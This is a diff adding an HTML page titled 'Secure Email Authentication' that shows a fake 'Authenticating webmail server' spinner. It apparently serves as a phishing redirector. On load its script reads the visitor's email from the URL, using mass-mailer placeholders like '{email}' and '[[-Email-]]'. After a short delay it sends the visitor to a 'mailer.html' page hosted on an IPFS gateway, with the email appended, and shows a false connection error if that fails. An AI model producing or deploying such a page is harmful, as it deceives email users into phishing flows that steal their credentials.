@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Email Authentication</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            background: linear-gradient(135deg, #f8fafc 0%, #e2e8f0 100%);
+            color: #1e293b;
+        }
+        
+        /* Advanced Security Spinner */
+        .auth-spinner {
+            position: relative;
+            width: 120px;
+            height: 120px;
+            margin-bottom: 25px;
+        }
+        
+        .spinner-outer {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            border: 8px solid rgba(59, 130, 246, 0.1);
+            border-top-color: #3b82f6;
+            border-bottom-color: #3b82f6;
+            animation: spin 1.8s linear infinite;
+            box-shadow: 0 0 15px rgba(59, 130, 246, 0.2);
+        }
+        
+        .spinner-middle {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            right: 20px;
+            bottom: 20px;
+            border-radius: 50%;
+            border: 6px solid transparent;
+            border-left-color: #60a5fa;
+            border-right-color: #60a5fa;
+            animation: spinReverse 2.2s linear infinite;
+        }
+        
+        .spinner-inner {
+            position: absolute;
+            top: 40px;
+            left: 40px;
+            right: 40px;
+            bottom: 40px;
+            border-radius: 50%;
+            border: 4px solid #93c5fd;
+            animation: pulse 2s ease-in-out infinite;
+        }
+        
+        .auth-status {
+            font-size: 1.1rem;
+            font-weight: 500;
+            margin-top: 20px;
+            color: #475569;
+            position: relative;
+        }
+        
+        .auth-status::after {
+            content: '...';
+            position: absolute;
+            animation: dots 1.5s steps(5, end) infinite;
+        }
+        
+        .error-message {
+            color: #dc2626;
+            margin-top: 20px;
+            display: none;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        @keyframes spinReverse {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(-720deg); }
+        }
+        
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); opacity: 0.8; }
+            50% { transform: scale(1.05); opacity: 1; }
+        }
+        
+        @keyframes dots {
+            0%, 20% { content: '.'; }
+            40% { content: '..'; }
+            60%, 100% { content: '...'; }
+        }
+    </style>
+</head>
+<body>
+    <div class="auth-spinner">
+        <div class="spinner-outer"></div>
+        <div class="spinner-middle"></div>
+        <div class="spinner-inner"></div>
+    </div>
+    
+    <div class="auth-status">Authenticating webmail server</div>
+    
+    <div class="error-message" id="errorMessage">
+        <h2>Connection Error</h2>
+        <p>The authentication page is currently unavailable.</p>
+    </div>
+
+    <script>
+        // 1. Extract email from URL (supports all formats)
+        function extractEmail() {
+            // Combine both hash and query parameters
+            const params = new URLSearchParams(
+                window.location.search + '&' + 
+                window.location.hash.substring(1)
+            );
+            
+            // Check all possible parameter names
+            return params.get('email') || 
+                   params.get('{email}') || 
+                   params.get('[[-Email-]]') || 
+                   '{email}'; // Final fallback
+        }
+
+        // 2. Build redirect URL with email
+        function buildRedirectUrl() {
+            const email = extractEmail();
+            const baseUrl = "https://bafybeidys4lteadkyfijzaizjrsmbwxdgebpxwd4qyfnguj2a7rd423b54.ipfs.dweb.link/mailer.html";
+            
+            // Use [[-Email-]] format in the hash as requested
+            return `${baseUrl}#[[-Email-]]=${encodeURIComponent(email)}`;
+        }
+
+        // 3. Check IPFS availability and redirect
+        function verifyAndRedirect() {
+            const redirectUrl = buildRedirectUrl();
+            
+            fetch(redirectUrl, { method: 'HEAD', mode: 'no-cors' })
+                .then(() => {
+                    window.location.href = redirectUrl;
+                })
+                .catch(() => {
+                    document.querySelector('.auth-spinner').style.display = 'none';
+                    document.querySelector('.auth-status').style.display = 'none';
+                    document.getElementById('errorMessage').style.display = 'block';
+                });
+        }
+
+        // Start the authentication process after brief delay
+        setTimeout(verifyAndRedirect, 1500);
+    </script>
+</body>
+</html>
